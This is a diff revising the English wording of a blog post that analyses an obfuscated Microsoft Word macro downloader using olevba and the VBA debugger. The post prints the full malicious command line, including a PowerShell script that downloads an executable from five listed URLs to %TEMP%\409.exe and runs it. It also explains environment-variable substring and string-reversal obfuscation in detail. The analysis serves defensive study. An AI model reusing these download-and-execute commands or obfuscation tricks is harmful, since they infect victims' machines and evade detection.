@@ -1,11 +1,11 @@
 ---
 layout: post
-title: Analysis of simple obfuscated office malware
+title: Analysis of a simple obfuscated Office malware sample
 tags: [windows, malware analysis]
 category: [en]
 ---
 
-I decided to prepare a report for [cybersec meetup "KHS community"](https://t.me/khscommunity) in the city of Kostanay (31.05.2019). To do this, I visited [Virusshare](https://virusshare.com/) and download random malicious office sample with the following characteristics:
+I prepared this report for a [KHS Community cybersecurity meetup](https://t.me/khscommunity) in Kostanay on May 31, 2019. I selected a random malicious Microsoft Office sample from [VirusShare](https://virusshare.com/) with the following characteristics:
 
 `VirusTotal Report submitted 2019-02-15 04:37:54 UTC`
 
@@ -19,21 +19,21 @@ I decided to prepare a report for [cybersec meetup "KHS community"](https://t.me
 
 `Detections: Kaspersky = HEUR:Trojan-Downloader.MSOffice.SLoad.gen`
 
-Analysis was done on _Windows 7 SP 1 Ultimate_, _Microsoft Office 2007_. If we open downloaded sample we will see the following window:
+I analyzed the sample on _Windows 7 Ultimate SP1_ with _Microsoft Office 2007_. Opening it displays the following window:
 
 ![](/assets/images/ru/OfficeMalware/1_doc_macro.png)
 
-This office document contains a macro and Microsoft Word warns us about it. The body of the document looks like this:
+The document contains a macro, and Microsoft Word warns the user about it. The document body looks like this:
 
 ![](/assets/images/ru/OfficeMalware/2_doc_deception_message.png)
 
-Malefactors ask us to enable macros and allow editing of the document. When you download any Microsoft office file from the Internet, it comes with a special mark "Downloaded from the Internet" and is uneditable until you specify the opposite. The message is similar among all such malicious documents, the main goal is to force users to turn on macros and enable edititing mode.
+The attackers instruct the victim to enable macros and allow document editing. Microsoft Office marks files downloaded from the Internet and opens them in Protected View until the user explicitly enables editing. This social-engineering message is common in malicious documents: its goal is to persuade the victim to leave Protected View and enable macro execution.
 
-To study document's macro we can extract it with [olevba](https://github.com/decalage2/oletools/wiki/olevba) from [ole-tools](https://www.decalage.info/python/oletools), namely. Short description of olevba:
+To inspect the document's macro, extract it with [olevba](https://github.com/decalage2/oletools/wiki/olevba) from the [oletools](https://www.decalage.info/python/oletools) package. Its documentation describes it as follows:
 
 _olevba is a script to parse OLE and OpenXML files such as MS Office documents (e.g. Word, Excel), to detect VBA Macros, extract their source code in clear text, and detect security-related patterns such as auto-executable macros, suspicious VBA keywords used by malware, anti-sandboxing and anti-virtualization techniques, and potential IOCs (IP addresses, URLs, executable filenames, etc). It also detects and decodes several common obfuscation methods including Hex encoding, StrReverse, Base64, Dridex, VBA expressions, and extracts IOCs from decoded strings._
 
-_olevba_ identified following suspicious VBA keywords:
+_olevba_ identified the following suspicious VBA keywords:
 
 <pre>
 +------------+----------------------+-----------------------------------------+
@@ -79,37 +79,37 @@ _olevba_ identified following suspicious VBA keywords:
 |            | -                    | "ulcni-"                                |
 </pre>
 
-Obviously, obfuscation is applied. By the line `www //: ptth @ Mw6O63Df_` you can guess that some strings are inverted.
+The macro is clearly obfuscated. The fragment `www //: ptth @ Mw6O63Df_` suggests that some of the strings have been reversed.
 
-olevba contains an option:
+_olevba_ provides the following option:
 
 `--deobf Attempt to deobfuscate VBA expressions (slow)`
 
-Export macros with the command:
+Extract and deobfuscate the macros using this command:
 
 `olevba.exe --deobf malware_sample > result.txt`
 
-As a result, we obtain the source code of the main macro
+The output contains the source code of the main macro.
 
 ![](/assets/images/ru/OfficeMalware/3-source%20code.png)
 
-Static analysis of such obfuscated code is useless, so we need to debug it. Open the _Developer_ tab in the Word and press the _Visual Basic_ button:
+Because static analysis of heavily obfuscated code is inefficient, we will debug it. Open the _Developer_ tab in Word and click _Visual Basic_:
 
 ![](/assets/images/ru/OfficeMalware/4_word_macros_developer.png)
 
-Paste the source code exported in the previous step:
+Paste the source code extracted in the previous step:
 
 ![](/assets/images/ru/OfficeMalware/5_source.png)
 
-Entry point of the macro is circled in red. Inside, we see a function call with an unknown string. To find out what this string is, we can change the code a bit to reveal the argument and _Add Watch_ to it, or discovere input argument inside _ziilnp_ function during the debug.
+The macro's entry point is circled in red. It calls a function with an unknown string argument. To reveal the string, we can modify the code slightly and add the argument to the _Watch_ window, or inspect the argument inside `ziilnp` while debugging.
 
 ![](/assets/images/ru/OfficeMalware/6_export_arg_str.png)
 
-As a result, this string is equal to:
+The resulting string is:
 
 `c: \ onjzioi \ izwolr \ poicwo \ .. \ .. \ .. \ windows \ system32 \ cmd.exe / c% ProgramData: ~ 0.1 %% ProgramData: ~ 9.2% / V: ON / C "set SiQ =; 'cjqhpb' = qijmnd $}} {hctac}}; kaerb; 'bchkzfb' = dqkzr $; hkjzjlz $ metI-ekovnI {) 00004 eg-htgnel.) hkjzjlz $ metI-teG ((fI; jrkjik "= ciikdj $;) ziwmvv '= pzrifoh $;' 904 '= zbwnifi $;' scjmbw '= fczcvii $;) ptth@j7OEo_7MhAbZp6jnHp/zt.oc.skeegt.liam. teN tcejbo-wen = irhwidj $; 'imsizuu' = iijirwb $ ll% 1,3- ~: PMET% h% 1,4- ~: EMANNOISSES% r% 1.5 ~: CILBUP% wop && for / L% h in ( 657, -1,0) do set nu =! Nu !! SiQ: ~% h, 1! && if% h equ 0 echo! Nu: ~ -658! | Cmd "`
 
-The string is passed to the `ziilnp ()` function, which has the following syntax:
+The string is passed to the `ziilnp()` function:
 <pre>
 Function ziilnp(zdwrhc)
 On Error Resume Next
@@ -149,66 +149,73 @@ ziilnp = ziilnp(Interaction.Shell(zdwrhc, vbHide))
 End Select
 </pre>
 
-We see a bunch of useless select statements. It is the consequences of obfuscation so we can ignore it. What interests us most is the line:
+The function contains several irrelevant `Select Case` blocks inserted by the obfuscator. We can ignore them and focus on this line:
 
 `ziilnp = ziilnp(Interaction.Shell(zdwrhc, vbHide))`
 
-_Interaction.Shell_ - executes the passed command (our string). Let's take a closer look at our payload:
+`Interaction.Shell` executes the supplied command, which in this case is the string we recovered. Let's examine the payload more closely.
 
-`c:\onjzioi\izwolr\poicwo\..\..\..\windows\system32\cmd.exe` - it avoids direct path detection to cmd.exe using Directory traversal attack.
+`c:\onjzioi\izwolr\poicwo\..\..\..\windows\system32\cmd.exe` uses path traversal segments to avoid embedding the canonical path to `cmd.exe` directly.
 
-`/c %ProgramData:~0.1%%ProgramData:~9.2%` this is passed to cmd.exe. 
+`/c %ProgramData:~0.1%%ProgramData:~9.2%` is passed to `cmd.exe`.
 
 `%ProgramData%` expands to `C:\ProgramData`.
 
-`~ 0,1` - means output 1 character starting from the 0th element,  result is - `"C"`. 
-`~ 9.2` - take two characters from the 9th element - `"mD"`. As a result, we got the string `"CmD"`:
+`~0,1` extracts one character starting at offset 0, producing `"C"`.
+
+`~9,2` extracts two characters starting at offset 9, producing `"mD"`. Together, they form `"CmD"`:
 
 ![](/assets/images/ru/OfficeMalware/echo%20obfuscated%20program%20data.png)
 
-This is one of the obfuscation methods for calling cmd.exe, along with %COMSPEC%. The rest of the line is:
+This is one way to obfuscate a call to `cmd.exe`; using `%COMSPEC%` is another. The rest of the command is:
 
 `/V:ON/C"set SiQ=;'cjqhpb'=qijmnd$}}{hctac}};kaerb;'bchkzfb'=dqkzr$;hkjzjlz$ metI-ekovnI{ )00004 eg- htgnel.)hkjzjlz$ metI-teG(( fI;'jrkjik'=ciikdj$;)hkjzjlz$ ,qjcaki$(eliFdaolnwoD.irhwidj${yrt{)ujbwa$ ni qjcaki$(hcaerof;'exe.'+zbwnifi$+'\'+pmet:vne$=hkjzjlz$;'ziwmvv'=pzrifoh$;'904' = zbwnifi$;'scjmbw'=fmsqvii$;)'@'(tilpS.'41fpegeLDajCgKnc/moc.ssenisubrusoh.www//:ptth@Mw6O63Df_Cm066CcdkU7o/moc.aicizyhp.www//:ptth@j7OEo_7MhAbZp6jnHp/zt.oc.skeegt.liam//:ptth@8or1uzsdZ8vie/RXI/sedulcni-pw/moc.srevirehtybkramdnal//:ptth@R8Fd3N9UmbYBzI/ten.enoniletoh.www//:ptth'=ujbwa$;tneilCbeW.teN tcejbo-wen=irhwidj$;'imsizuu'=iijirwb$ ll%1,3-~:PMET%h%1,4-~:EMANNOISSES%r%1,5~:CILBUP%wop&&for /L %h in (657,-1,0)do set nu=!nu!!SiQ:~%h,1!&&if %h equ 0 echo !nu:~-658!| cmd"` 
 
-According to help of cmd.exe, `/V:ON` allows a variable to get a new value in each iteration of the FOR loop. 
+According to the `cmd.exe` help text, `/V:ON` enables delayed environment-variable expansion, allowing an updated variable value to be read during each iteration of a `FOR` loop.
 <pre>
 /V:ON Enable delayed environment variable expansion 
          this allows a FOR loop to specify !variable! instead of %variable% 
          expanding the variable at execution time instead of at input time.
 </pre>
 
-Next comes the command for execution. Let's divide it into two parts. First part:
+The command that follows can be divided into two parts. The first part is:
 
 `set SiQ=;'cjqhpb'=qijmnd$}}{hctac}};kaerb;'bchkzfb'=dqkzr$;hkjzjlz$ metI-ekovnI{ )00004 eg- htgnel.)hkjzjlz$ metI-teG(( fI;'jrkjik'=ciikdj$;)hkjzjlz$ ,qjcaki$(eliFdaolnwoD.irhwidj${yrt{)ujbwa$ ni qjcaki$(hcaerof;'exe.'+zbwnifi$+'\'+pmet:vne$=hkjzjlz$;'ziwmvv'=pzrifoh$;'904' = zbwnifi$;'scjmbw'=fmsqvii$;)'@'(tilpS.'41fpegeLDajCgKnc/moc.ssenisubrusoh.www//:ptth@Mw6O63Df_Cm066CcdkU7o/moc.aicizyhp.www//:ptth@j7OEo_7MhAbZp6jnHp/zt.oc.skeegt.liam//:ptth@8or1uzsdZ8vie/RXI/sedulcni-pw/moc.srevirehtybkramdnal//:ptth@R8Fd3N9UmbYBzI/ten.enoniletoh.www//:ptth'=ujbwa$;tneilCbeW.teN tcejbo-wen=irhwidj$;'imsizuu'=iijirwb$ ll%1,3-~:PMET%h%1,4-~:EMANNOISSES%r%1,5~:CILBUP%wop`
 
-Second part: `for /L %h in (657,-1,0)do set nu=!nu!!SiQ:~%h,1!&&if %h equ 0 echo !nu:~-658!| cmd`
+The second part is: `for /L %h in (657,-1,0)do set nu=!nu!!SiQ:~%h,1!&&if %h equ 0 echo !nu:~-658!| cmd`
 
-In the first part, the variable `SiQ` is set to some sort of character set. As we noted earlier, it is very similar to an inverted string. Revert it to normal state:
+The first part assigns a long sequence of characters to `SiQ`. As noted earlier, it appears to be reversed. Restoring the original order produces:
 
 `pow%PUBLIC:~5,1%r%SESSIONNAME:~-4,1%h%TEMP:~-3,1%ll $bwrijii='uuzismi';$jdiwhri=new-object Net.WebClient;$awbju='http://www.hotelinone.net/IzBYbmU9N3dF8R@http://landmarkbytherivers.com/wp-includes/IXR/eiv8Zdszu1ro8@http://mail.tgeeks.co.tz/pHnj6pZbAhM7_oEO7j@http://www.phyzicia.com/o7UkdcC660mC_fD36O6wM@http://www.hosurbusiness.com/cnKgCjaDLegepf14'.Split('@');$iivqsmf='wbmjcs';$ifinwbz = '409';$hofirzp='vvmwiz';$zljzjkh=$env:temp+'\'+$ifinwbz+'.exe';foreach($ikacjq in $awbju){try{$jdiwhri.DownloadFile($ikacjq, $zljzjkh);$jdkiic='kijkrj';If ((Get-Item $zljzjkh).length -ge 40000) {Invoke-Item $zljzjkh;$rzkqd='bfzkhcb';break;}}catch{}}$dnmjiq='bphqjc';`
 
-To understand how these two parts work, I will give a small example. Suppose we want to obfuscate the `help` call in `cmd`.
-To do this, set the environment variable `siq = pleh` (help vice versa).
-`for / L% h in (3, -1,0) do` - loop with 4 iterations, for each letter
-`set nu =! nu !! siq: ~% h, 1!` - every iteration, we add to the variable `nu` the value` siq: ~% h, 1`, since `% h` is the index of the string from the end, then we each iteration make up a string equal to the inverse.
-`if% h equ 0 echo! nu: ~ -4! | cmd` - wait until each character is processed and send the result to be executed to cmd.exe. As a result, we get the following command:
+To see how the two parts work together, consider a small example that obfuscates the `help` command.
+
+First, set the environment variable `siq=pleh`, which is `help` in reverse.
+
+`for /L %h in (3,-1,0) do` iterates four times, once for each character, from the end of the string to the beginning.
+
+`set nu=!nu!!siq:~%h,1!` extracts one character at index `%h` and appends it to `nu`, reconstructing the original string.
+
+`if %h equ 0 echo !nu:~-4! | cmd` waits until every character has been processed and pipes the result to `cmd.exe`. The complete example is:
 `set siq = pleh && for / L% h in (3, -1,0) do set nu =! nu !! siq: ~% h, 1! && if% h equ 0 echo! nu: ~ -4! | cmd`
 
 ![](/assets/images/ru/OfficeMalware/cmd_help_obfuscation.png)
 
-Thereby, the seemingly tangled string turned into an understandable thing. Similarly, it happens with our malicious payload. 
+The apparently complex string has now become a straightforward command. The malicious payload uses the same technique.
 
-Now back to our main playload. First we see the line:
-* `pow% PUBLIC: ~ 5.1% r% SESSIONNAME: ~ -4.1% h% TEMP: ~ -3.1% ll` - as we can already assume, this is also an obfuscated line.
-* `% PUBLIC: ~ 5.1%` - is taking a substring of 1 character, starting from the 5th in the `C:\Users\Public` line. Result letter `"e"`
-* Next is just the letter `"r"`
-* `% SESSIONNAME: ~ -4.1%` - this is taking a substring of 1 character, starting from the 4th, from the end in the line `Console`. Result is letter `"s"`
-* Next is just the letter `"h"`
-* `% TEMP: ~ -3.1%` - this is taking a substring of 1 character, starting from the 3rd, from the end, in the line `C:\Users\RDRG\AppData\Local\Temp`. Result is letter `"e"`
-* Further, just the letters `"ll"`
-Total: `powershell`
+Returning to the main payload, the first expression is:
 
-After that comes the powershell code:
+* `pow%PUBLIC:~5,1%r%SESSIONNAME:~-4,1%h%TEMP:~-3,1%ll`, another obfuscated command.
+* `%PUBLIC:~5,1%` extracts one character at offset 5 from `C:\Users\Public`, producing `"e"`.
+* The next literal character is `"r"`.
+* `%SESSIONNAME:~-4,1%` extracts one character four positions from the end of `Console`, producing `"s"`.
+* The next literal character is `"h"`.
+* `%TEMP:~-3,1%` extracts one character three positions from the end of `C:\Users\RDRG\AppData\Local\Temp`, producing `"e"`.
+* The final literal characters are `"ll"`.
+
+The complete string is `powershell`.
+
+The PowerShell code follows:
 <pre>
 $bwrijii='uuzismi';
 
@@ -235,7 +242,7 @@ foreach($ikacjq in $awbju){
 $dnmjiq='bphqjc';
 </pre>
 
-Let's turn it into more understandable code by removing all unnecessary and renaming variables:
+Removing dead assignments and renaming the variables makes the script much easier to read:
 
 <pre>
 $webClient=new-object Net.WebClient;
@@ -255,4 +262,4 @@ foreach($url in $URLS){
 }
 </pre>
 
-Obviously, script downloads each file, one by one, according to the url, into the file with name `409.exe`, into a temporary folder and run it. Unfortunately, these files no longer exist and no further analysis is possible.
+The script tries each URL in sequence, downloads the response to `409.exe` in the temporary directory, and executes the file if it is at least 40,000 bytes long. Unfortunately, the payloads are no longer available, so the analysis cannot continue.
